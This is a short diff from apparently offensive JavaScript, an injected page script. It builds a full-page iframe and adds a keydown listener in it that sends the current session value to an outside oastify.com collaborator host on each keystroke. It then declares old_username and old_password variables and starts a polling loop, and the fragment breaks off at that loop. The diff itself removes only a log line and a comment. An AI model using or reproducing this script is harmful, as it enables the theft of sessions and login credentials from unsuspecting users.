@@ -8,14 +8,11 @@ iframe.width = '100%';
 iframe.height = '100%'; 
 iframe.style.border = 'none';
 iframe.onload = function () {
-    console.log('Iframe has loaded successfully!');
     iframe.contentWindow.addEventListener('keydown', (event) => {
     fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${currSession}`, {mode: 'no-cors',});
 });
 };
 document.body.appendChild(iframe);
-//=================================================================================
-
 let old_username = ""
 let old_password = ""
 setInterval(()=> {
